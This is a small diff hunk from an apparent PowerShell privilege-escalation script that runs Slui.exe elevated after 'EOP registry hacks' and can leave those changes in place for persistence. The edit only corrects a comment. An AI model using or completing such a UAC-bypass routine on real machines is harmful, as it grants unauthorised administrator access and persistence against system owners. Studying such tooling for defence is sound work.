@@ -98,7 +98,7 @@ If($CheckVuln -eq $True){
    Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
-   ## If $MakeItPersistence = "False" then the EOP registry hacks will NOT
+   ## If $MakeItPersistence = "True" then the EOP registry hacks will NOT
    # be deleted in the end of script execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
       ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
